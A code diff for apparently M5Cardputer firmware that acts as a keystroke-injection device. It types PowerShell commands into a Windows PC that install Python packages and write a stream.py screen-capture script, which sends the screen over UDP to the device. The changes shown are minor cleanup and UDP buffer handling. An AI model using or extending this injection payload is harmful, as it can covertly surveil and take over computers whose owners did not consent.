@@ -368,7 +368,6 @@ bool runOnboarding() {
     drawWatermark();
     if (!waitEnterOrEsc(true)) return false;
 
-
     drawMessage("STEP 3: SYSTEM", "Works on Win 10 & 11.", "PowerShell will open", ORANGE);
     M5Cardputer.Display.setTextDatum(top_center);
     M5Cardputer.Display.drawString("to install modules.", 120, 85);
@@ -430,7 +429,7 @@ bool injectPayload() {
     Keyboard.print("pip install mss opencv-python numpy\n"); 
     if (!safeDelay(1500)) goto abort_injection;
     
-    { // Блок области видимости (Scope) для безопасного использования goto
+    {
         String py = String("Set-Content -Path stream.py -Value @\"\n"
                     "import mss, cv2, socket, numpy as np, struct, math, time, sys, os\n"
                     "UDP_IP = '") + WiFi.localIP().toString() + String("'\n"
@@ -495,7 +494,7 @@ python stream.py; exit)=====");
             }
             delay(5);
         }
-    } // Конец безопасного блока
+    }
 
     playSound(3000, 300);
     return true;
@@ -691,10 +690,12 @@ void loop() {
                     currentState = READY;
                     pc_port = 0; 
                     
+                    while(udp.parsePacket() > 0) { udp.read(); }
+                    
                     showReadyScreen();
                     
                     while(M5Cardputer.Keyboard.keysState().enter) { M5Cardputer.update(); delay(10); }
-                    break;
+                    return; 
                 }
                 if (M5Cardputer.Keyboard.isKeyPressed('`') || confirm_status.del) {
                     while(M5Cardputer.Keyboard.isKeyPressed('`') || M5Cardputer.Keyboard.keysState().del) {
@@ -709,9 +710,13 @@ void loop() {
         if (pc_port != 0 && (millis() - last_packet_time > 2000)) {
             currentState = READY;
             pc_port = 0;
+            
+            while(udp.parsePacket() > 0) { udp.read(); }
+            
             M5Cardputer.Display.clear();
             drawMessage("DISCONNECTED", "Stream stopped.", "Press 'G' to inject again", ORANGE);
             playSound(1000, 500);
+            return; 
         }
 
         if (pc_port != 0 && (millis() - last_frame_time > 1500)) {
